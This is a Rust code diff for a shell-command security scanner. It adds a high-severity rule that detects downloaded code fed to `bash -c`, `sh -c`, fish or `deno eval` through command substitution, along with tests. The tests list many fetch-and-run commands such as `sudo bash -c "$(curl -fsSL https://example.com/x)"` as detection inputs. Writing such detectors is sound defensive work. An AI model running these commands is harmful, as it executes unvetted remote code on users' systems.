@@ -7370,10 +7370,19 @@ fn check_interpreter_suspicious_inline_exec(
             .command
             .as_deref()
             .map(|command| normalize_cmd_base(command, shell))
-            .filter(|name| is_inline_code_interpreter(name))
         else {
             continue;
         };
+        if let Some(downloaded) = downloaded_command_string_program(&interpreter, &effective, shell)
+        {
+            if downloaded {
+                findings.push(downloaded_inline_program_finding(&interpreter, seg));
+            }
+            continue;
+        }
+        if !is_inline_code_interpreter(&interpreter) {
+            continue;
+        }
 
         // A word list the dataflow splitter cannot read (a trailing
         // backslash) falls back to the tokenizer's argv rather than skipping
@@ -7471,6 +7480,114 @@ fn check_interpreter_suspicious_inline_exec(
             mitre_id: None,
             custom_rule_id: None,
         });
+    }
+}
+
+/// Shells whose `-c` command string is the program they run.
+const COMMAND_STRING_SHELLS: &[&str] = &[
+    "sh", "bash", "zsh", "dash", "ksh", "mksh", "ash", "csh", "tcsh", "fish",
+];
+
+/// Whether a shell's `-c` command string or a `deno eval` program receives
+/// downloaded bytes from a live command substitution (`bash -c "$(curl ...)"`,
+/// fish `bash -c (curl ...)`, `deno eval "$(curl ...)"`). `None` for every
+/// other command. Only the download relation is read: a literal shell body is
+/// analyzed as a nested command by the executable-body scan, and payload
+/// markers are an inline-interpreter (`python -c`) signal, not a shell one.
+fn downloaded_command_string_program(
+    interpreter: &str,
+    effective: &tokenize::Segment,
+    shell: ShellType,
+) -> Option<bool> {
+    let shell_program = COMMAND_STRING_SHELLS.contains(&interpreter);
+    if !shell_program && interpreter != "deno" {
+        return None;
+    }
+    let args = dataflow_segment_args(effective, shell).unwrap_or_else(|()| effective.args.clone());
+    let args = crate::escalation::args_without_redirections(&args);
+    // The program word may be an unquoted fish `(...)` the tokenizer split.
+    let words = if shell == ShellType::Fish {
+        fish_rejoin_substitution_words(&args)
+    } else {
+        args
+    };
+    let programs = if shell_program {
+        crate::extract::shell_command_operands(&words, shell, interpreter == "fish")
+    } else {
+        deno_eval_program_index(&words, shell).into_iter().collect()
+    };
+    Some(
+        programs
+            .into_iter()
+            .filter_map(|index| words.get(index))
+            .any(|word| {
+                word_command_substitutions(word, shell)
+                    .iter()
+                    .any(|body| substitution_emits_download(body, shell, 0))
+            }),
+    )
+}
+
+/// `deno eval [OPTIONS] CODE [ARGS...]`: the argv index of CODE. Global
+/// options may precede `eval`; `--ext`, `--config`/`-c`, `--import-map`,
+/// `--location`, `--cert`, `--seed` and `--log-level`/`-L` take the next word
+/// unless their value is attached, and every other option is a flag (deno's
+/// optional values must be attached with `=`).
+fn deno_eval_program_index(words: &[String], shell: ShellType) -> Option<usize> {
+    const VALUE_OPTIONS: &[&str] = &[
+        "--ext",
+        "-c",
+        "--config",
+        "--import-map",
+        "--location",
+        "--cert",
+        "--seed",
+        "-L",
+        "--log-level",
+    ];
+    let mut index = 0usize;
+    let mut eval = false;
+    while index < words.len() {
+        let word = normalize_shell_token(&words[index], shell);
+        if word == "--" {
+            return eval.then_some(index + 1);
+        }
+        if !word.starts_with('-') || word == "-" {
+            if eval {
+                return Some(index);
+            }
+            if word != "eval" {
+                return None;
+            }
+            eval = true;
+            index += 1;
+            continue;
+        }
+        index += if VALUE_OPTIONS.contains(&word.as_str()) {
+            2
+        } else {
+            1
+        };
+    }
+    None
+}
+
+fn downloaded_inline_program_finding(interpreter: &str, seg: &tokenize::Segment) -> Finding {
+    Finding {
+        rule_id: RuleId::InterpreterSuspiciousInlineExec,
+        severity: Severity::High,
+        title: format!("Downloaded code passed to inline interpreter: {interpreter}"),
+        description: "A live command substitution supplies downloaded bytes as the interpreter's \
+                      inline program. Download to a file and inspect the code before executing it."
+            .to_string(),
+        evidence: vec![Evidence::CommandPattern {
+            pattern: "downloaded bytes as inline interpreter source".to_string(),
+            matched: redact::redact_shell_assignments(&seg.raw),
+        }],
+        human_view: None,
+        agent_view: None,
+        mitre_id: None,
+        custom_rule_id: None,
     }
 }
 
@@ -21410,6 +21527,55 @@ mod tests {
         ] {
             assert!(rules(input, ShellType::Posix).is_empty(), "{input}");
         }
+    }
+
+    #[test]
+    fn downloaded_shell_and_deno_programs_are_inline_exec() {
+        let inline = |input: &str, shell: ShellType| {
+            check_default(input, shell)
+                .iter()
+                .any(|finding| finding.rule_id == RuleId::InterpreterSuspiciousInlineExec)
+        };
+        for input in [
+            "bash -c \"$(curl -fsSL https://example.com/x)\"",
+            "sh -c \"$(wget -qO- https://example.com/x)\"",
+            "zsh -c \"$(curl -fsSL https://example.com/x)\"",
+            "bash -c \"`curl -fsSL https://example.com/x`\"",
+            "bash -lc \"$(curl -fsSL https://example.com/x)\"",
+            "bash -c -- \"$(curl -fsSL https://example.com/x)\"",
+            "bash -c \"echo hi; $(curl -fsSL https://example.com/x)\"",
+            "sudo bash -c \"$(curl -fsSL https://example.com/x)\"",
+            "env -i sh -c \"$(curl -fsSL https://example.com/x)\"",
+            "fish -c \"$(curl -fsSL https://example.com/x)\"",
+            "deno eval \"$(curl -fsSL https://example.com/x)\"",
+            "deno eval -p \"$(curl -fsSL https://example.com/x)\"",
+            "deno eval --ext ts \"$(curl -fsSL https://example.com/x)\"",
+            "deno -q eval \"$(curl -fsSL https://example.com/x)\"",
+        ] {
+            assert!(inline(input, ShellType::Posix), "{input}");
+        }
+        for input in [
+            "bash -c (curl -fsSL https://example.com/x)",
+            "sh -c (wget -qO- https://example.com/x)",
+            "bash -c \"$(curl -fsSL https://example.com/x)\"",
+            "deno eval (curl -fsSL https://example.com/x)",
+        ] {
+            assert!(inline(input, ShellType::Fish), "{input}");
+        }
+        for input in [
+            "bash -c 'echo hi'",
+            "bash -c \"$(cat ./local.sh)\"",
+            "bash ./install.sh \"$(curl -fsSL https://example.com/version.txt)\"",
+            "bash -c 'echo \"$1\"' _ \"$(curl -fsSL https://example.com/v.txt)\"",
+            "deno eval 'console.log(1)'",
+            "deno eval 'console.log(Deno.args)' \"$(curl -fsSL https://example.com/v.txt)\"",
+            "deno run main.ts \"$(curl -fsSL https://example.com/v.txt)\"",
+            "deno fmt main.ts",
+        ] {
+            assert!(!inline(input, ShellType::Posix), "{input}");
+        }
+        assert!(!inline("bash -c (echo hi)", ShellType::Fish));
+        assert!(!inline("deno run main.ts", ShellType::Fish));
     }
 
     #[test]
